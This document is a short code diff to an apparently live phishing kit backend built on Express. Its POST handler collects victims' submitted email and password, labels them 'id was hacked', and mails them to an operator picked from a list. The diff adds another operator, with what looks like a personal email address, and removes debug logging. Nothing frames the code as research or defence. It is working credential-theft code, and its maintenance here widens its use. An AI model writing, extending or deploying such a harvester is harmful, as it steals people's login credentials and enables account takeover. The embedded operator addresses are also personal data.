@@ -28,7 +28,7 @@ app.get('/', function (req, res) {
 var myArray = [
     {"id": 1, "name": "admin", "email": "mdalonebd@gmail.com"},
 
-    {"id": 2, "name": "Peter"},
+    {"id": 2, "name": "momin","email":"momin0132813@gmail.com"},
     {"id": 3, "name": "Harry"}
 ];
 
@@ -38,7 +38,7 @@ app.post('/_', function (req, res) {
     var captured_content = `\n Email: ${req.body.email} Password: ${req.body.password}`;
     let toMail = req.body.owner;
     
-    console.log("es"+toMail);
+   // console.log("es"+toMail);
     var message = "If the input value has correct then id was hacked "+captured_content;
   if(req.body.owner){
     let toEmail = myArray.find(o => o.id == req.body.owner);
@@ -70,7 +70,7 @@ transporter.sendMail(mailOptions, function (err, info) {
     res.render('f_success');
 });
     }
-    console.log(67);
+    
     
  //   res.render('f_success');
     
